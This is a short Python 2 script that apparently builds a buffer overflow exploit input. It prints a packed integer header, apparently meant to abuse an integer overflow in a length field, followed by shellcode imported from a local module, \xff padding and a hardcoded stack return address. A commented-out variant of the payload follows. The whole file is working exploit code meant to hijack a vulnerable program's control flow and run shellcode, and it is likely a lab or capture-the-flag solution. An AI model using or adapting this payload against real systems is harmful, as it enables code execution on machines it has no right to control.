from shellcode import shellcode
from struct import pack

print pack("<I",0x40000002) + shellcode + (76-len(shellcode))*"\xff" + pack("<I",0xbffe8ec0)

#print pack("<I",0x40000001) + shellcode + 50*"\xff"
